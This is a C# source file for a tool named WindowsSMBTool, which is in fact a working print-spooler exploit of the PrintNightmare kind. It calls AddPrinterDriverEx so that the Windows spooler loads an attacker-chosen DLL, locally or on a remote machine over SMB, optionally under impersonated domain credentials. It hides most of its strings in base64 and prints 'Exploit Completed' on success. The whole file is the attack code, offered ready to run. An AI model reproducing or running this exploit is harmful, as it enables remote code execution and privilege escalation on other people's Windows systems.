//start
using System.Text;
using System.Linq;
using System;
﻿using Microsoft.Win32;
using System.Collections.Generic;
using System.ComponentModel;
using System.IO;
using System.Runtime.InteropServices;
using Tools;

namespace WindowsSMBTool
{
    class Program
    {
        [DllImport("kernel32.dll")]
        static extern uint GetLastError();

        [DllImport("winspool.drv", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern bool AddPrinterDriverEx([Optional] string pName, uint Level, [In, Out] IntPtr pDriverInfo, uint dwFileCopyFlags);

        [DllImport("winspool.drv", CharSet = CharSet.Auto, SetLastError = true)]
        static extern bool EnumPrinterDrivers(String pName, String pEnvironment, uint level, IntPtr pDriverInfo, uint cdBuf, ref uint pcbNeeded, ref uint pcRetruned);

        public struct DRIVER_INFO_2
        {
            public uint cVersion;
            [MarshalAs(UnmanagedType.LPTStr)]
            public string pName;
            [MarshalAs(UnmanagedType.LPTStr)]
            public string pEnvironment;
            [MarshalAs(UnmanagedType.LPTStr)]
            public string pDriverPath;
            [MarshalAs(UnmanagedType.LPTStr)]
            public string pDataFile;
            [MarshalAs(UnmanagedType.LPTStr)]
            public string pConfigFile;
        }

        public static uint APD_STRICT_UPGRADE = 0x00000001;
        public static uint APD_STRICT_DOWNGRADE = 0x00000002;
        public static uint APD_COPY_ALL_FILES = 0x00000004;
        public static uint APD_COPY_NEW_FILES = 0x00000008;
        public static uint APD_COPY_FROM_DIRECTORY = 0x00000010;
        public static uint APD_DONT_COPY_FILES_TO_CLUSTER = 0x00001000;
        public static uint APD_COPY_TO_ALL_SPOOLERS = 0x00002000;
        public static uint APD_INSTALL_WARNED_DRIVER = 0x00008000;
        public static uint APD_RETURN_BLOCKING_STATUS_CODE = 0x00010000;

        static void Main(string[] args)
        {
            string dllpath;
            string computername = null;
            string pDriverPath = null;
            string domain = Encoding.UTF8.GetString(Convert.FromBase64String("TmV2ZXJHb25uYUdpdmVZb3VVcA=="));
            string user = Encoding.UTF8.GetString(Convert.FromBase64String("TmV2ZXJHb25uYUxldFlvdURvd24="));
            string password = Encoding.UTF8.GetString(Convert.FromBase64String("TmV2ZXJHb25uYVJ1bkFyb3VuZEFuZERlc2VydFlvdQ=="));

            if (args == null || args.Length == 0)
            {
                Console.WriteLine(Encoding.UTF8.GetString(Convert.FromBase64String("LUxvY2FsbHk=")));
                Console.WriteLine(" .\\WindowsSMBTool.exe C:\\addCube.dll");
                Console.WriteLine(Encoding.UTF8.GetString(Convert.FromBase64String("LVJlbW90ZSB1c2luZyBjdXJyZW50IGNvbnRleHQ=")));
                Console.WriteLine(" .\\WindowsSMBTool.exe '\\\\192.168.1.215\\smb\\addCube.dll' '\\\\192.168.1.20'");
                Console.WriteLine(Encoding.UTF8.GetString(Convert.FromBase64String("LVJlbW90ZSB1c2luZyBydW5hcw==")));
                Console.WriteLine(" .\\WindowsSMBTool.exe '\\\\192.168.1.215\\smb\\addCube.dll' '\\\\192.168.1.20' hackit.local domain_user Pass123");
                Environment.Exit(0);
            }
            dllpath = args[0];
            if (dllpath.Contains(Encoding.UTF8.GetString(Convert.FromBase64String("XFxcXA=="))))
            {
                dllpath = dllpath.Replace("\\\\", "\\??\\UNC\\");
            }

            if (args.Length > 2)
            {
                domain = args[2];
                user = args[3];
                password = args[4];
            }

            using (new Impersonator.Impersonation(domain, user, password))
            {
                if (args.Length > 1 && args.Length <= 5)
                {
                    computername = args[1];
                    List<string> drivers = getDrivers(computername);
                    pDriverPath = Path.GetDirectoryName(drivers[0]) + Encoding.UTF8.GetString(Convert.FromBase64String("XFxBbWQ2NFxcVU5JRFJWLkRMTA=="));
                    if (string.IsNullOrEmpty(pDriverPath))
                    {
                        Console.WriteLine(Encoding.UTF8.GetString(Convert.FromBase64String("Wy1dIFNwZWNpZnkgcERyaXZlclBhdGggbWFudWFsbHk=")));
                        Environment.Exit(1);
                    }
                }
                else if (args.Length > 5)
                {
                    pDriverPath = args[5];
                }
                else //Find local driver
                {
                    DRIVER_INFO_2[] drivers = getDrivers();
                    foreach (DRIVER_INFO_2 driver in drivers)
                    {
                        if (driver.pDriverPath.ToLower().Contains(Encoding.UTF8.GetString(Convert.FromBase64String("ZmlsZXJlcG9zaXRvcnk="))))
                        {
                            pDriverPath = driver.pDriverPath;
                            break;
                        }
                    }
                    if (string.IsNullOrEmpty(pDriverPath))
                    {
                        Console.WriteLine($"[-] pDriverPath {drivers[0].pDriverPath}, expected :\\Windows\\System32\\DriverStore\\FileRepository\\.....");
                        Console.WriteLine(Encoding.UTF8.GetString(Convert.FromBase64String("Wy1dIFNwZWNpZnkgcERyaXZlclBhdGggbWFudWFsbHk=")));
                        Environment.Exit(1);
                    }
                }
                Console.WriteLine($"[*] pDriverPath {pDriverPath}");
                Console.WriteLine($"[*] Executing {dllpath}");
                Console.WriteLine(Encoding.UTF8.GetString(Convert.FromBase64String("WypdIFRyeSAxLi4u")));
                addPrinter(dllpath, pDriverPath, computername);
                Console.WriteLine(Encoding.UTF8.GetString(Convert.FromBase64String("WypdIFRyeSAyLi4u")));
                addPrinter(dllpath, pDriverPath, computername);
                Console.WriteLine(Encoding.UTF8.GetString(Convert.FromBase64String("WypdIFRyeSAzLi4u")));
                addPrinter(dllpath, pDriverPath, computername);
            }
        }

        static void addPrinter(string dllpath, string pDriverPath, string computername)
        {
            //pDriverPath = Encoding.UTF8.GetString(Convert.FromBase64String("QzpcXFdpbmRvd3NcXFN5c3RlbTMyXFxEcml2ZXJTdG9yZVxcRmlsZVJlcG9zaXRvcnlcXG50cHJpbnQuaW5mX2FtZDY0XzgzYWE5YWViZjVkZmZjOTZcXEFtZDY0XFxVTklEUlYuRExM")); // 2019 debug
            //pDriverPath = Encoding.UTF8.GetString(Convert.FromBase64String("QzpcXFdpbmRvd3NcXFN5c3RlbTMyXFxEcml2ZXJTdG9yZVxcRmlsZVJlcG9zaXRvcnlcXG50cHJpbnQuaW5mX2FtZDY0X2FkZGIzMWY5YmZmOWU5MzZcXEFtZDY0XFxVTklEUlYuRExM")); // 2016 debug

            DRIVER_INFO_2 Level2 = new DRIVER_INFO_2();
            Level2.cVersion = 3;
            Level2.pConfigFile = Encoding.UTF8.GetString(Convert.FromBase64String("QzpcXFdpbmRvd3NcXFN5c3RlbTMyXFx3aW5odHRwLmRsbA==")); //replace kernelbase with winhttp
            Level2.pDataFile = dllpath;
            Level2.pDriverPath = pDriverPath;
            Level2.pEnvironment = Encoding.UTF8.GetString(Convert.FromBase64String("V2luZG93cyB4NjQ="));
            Level2.pName = Encoding.UTF8.GetString(Convert.FromBase64String("MTIzNDU="));

            string filename = Path.GetFileName(dllpath);
            uint flags = APD_COPY_ALL_FILES | 0x10 | 0x8000;

            IntPtr pnt = Marshal.AllocHGlobal(Marshal.SizeOf(Level2));
            Marshal.StructureToPtr(Level2, pnt, false);

            AddPrinterDriverEx(computername, 2, pnt, flags);
            Console.WriteLine(Encoding.UTF8.GetString(Convert.FromBase64String("WypdIFN0YWdlIDA6IA==")) + Marshal.GetLastWin32Error());
            Marshal.FreeHGlobal(pnt);

            Level2.pConfigFile = Encoding.UTF8.GetString(Convert.FromBase64String("QzpcXFdpbmRvd3NcXFN5c3RlbTMyXFxrZXJuZWxiYXNlLmRsbA=="));
            for (int i = 1; i <= 30; i++)
            {
                Level2.pConfigFile = $"C:\\Windows\\System32\\spool\\drivers\\x64\\3\\old\\{i}\\{filename}";
                IntPtr pnt2 = Marshal.AllocHGlobal(Marshal.SizeOf(Level2));
                Marshal.StructureToPtr(Level2, pnt2, false);

                AddPrinterDriverEx(computername, 2, pnt2, flags);
                int errorcode = Marshal.GetLastWin32Error();
                Marshal.FreeHGlobal(pnt2);
                if (errorcode == 0)
                {
                    Console.WriteLine($"[*] Stage {i}: " + errorcode);
                    Console.WriteLine(Encoding.UTF8.GetString(Convert.FromBase64String("WytdIEV4cGxvaXQgQ29tcGxldGVk")));
                    Environment.Exit(0);
                }
            }
        }

        static List<string> getDrivers(string computername)
        {
            computername = computername.Trim('\\');
            string driverpath = Encoding.UTF8.GetString(Convert.FromBase64String("U09GVFdBUkVcXE1pY3Jvc29mdFxcV2luZG93cyBOVFxcQ3VycmVudFZlcnNpb25cXFByaW50XFxQYWNrYWdlSW5zdGFsbGF0aW9uXFxXaW5kb3dzIHg2NFxcRHJpdmVyUGFja2FnZXM="));
            List<string> drivers = new List<string>();
            try
            {
                RegistryKey environmentKey = RegistryKey.OpenRemoteBaseKey(RegistryHive.LocalMachine, computername);

                foreach (string subKeyName in environmentKey.OpenSubKey(driverpath).GetSubKeyNames().Where(item => item.Contains(Encoding.UTF8.GetString(Convert.FromBase64String("bnRwcmludC5pbmZfYW1kNjQ=")))))
                {
                    string path;
                    path = (string)environmentKey.OpenSubKey(driverpath + "\\" + subKeyName).GetValue(Encoding.UTF8.GetString(Convert.FromBase64String("RHJpdmVyU3RvcmVQYXRo")));
                    if (!String.IsNullOrEmpty(path))
                    {
                        drivers.Add(path);
                    }
                }
                environmentKey.Close();
            }
            catch
            {
                Console.WriteLine(Encoding.UTF8.GetString(Convert.FromBase64String("Wy1dIEZhaWxlZCB0byBlbnVtZXJhdGUgcHJpbnRlciBkcml2ZXJz")));
                Environment.Exit(1);
            }

            return drivers;

        }

        static DRIVER_INFO_2[] getDrivers()
        {
            uint cbNeeded = 0;
            uint cReturned = 0;

            if (EnumPrinterDrivers(null, Encoding.UTF8.GetString(Convert.FromBase64String("V2luZG93cyB4NjQ=")), 2, IntPtr.Zero, 0, ref cbNeeded, ref cReturned))
            {
                throw new Exception(Encoding.UTF8.GetString(Convert.FromBase64String("RW51bVByaW50ZXJzIHNob3VsZCBmYWlsIQ==")));
            }

            int lastWin32Error = Marshal.GetLastWin32Error();
            if (lastWin32Error != 122)
            {
                throw new Win32Exception(lastWin32Error);
            }

            IntPtr pAddr = Marshal.AllocHGlobal((int)cbNeeded);
            if (EnumPrinterDrivers(null, Encoding.UTF8.GetString(Convert.FromBase64String("V2luZG93cyB4NjQ=")), 2, pAddr, cbNeeded, ref cbNeeded, ref cReturned))
            {
                DRIVER_INFO_2[] printerInfo2 = new DRIVER_INFO_2[cReturned];
                long offset;
                offset = pAddr.ToInt64();
                Type type = typeof(DRIVER_INFO_2);
                int increment = Marshal.SizeOf(type);
                for (int i = 0; i < cReturned; i++)
                {
                    printerInfo2[i] = (DRIVER_INFO_2)Marshal.PtrToStructure(new IntPtr(offset), type);
                    offset += increment;
                }
                Marshal.FreeHGlobal(pAddr);
                return printerInfo2;
            }

            throw new Win32Exception(Marshal.GetLastWin32Error());
        }
    }
}
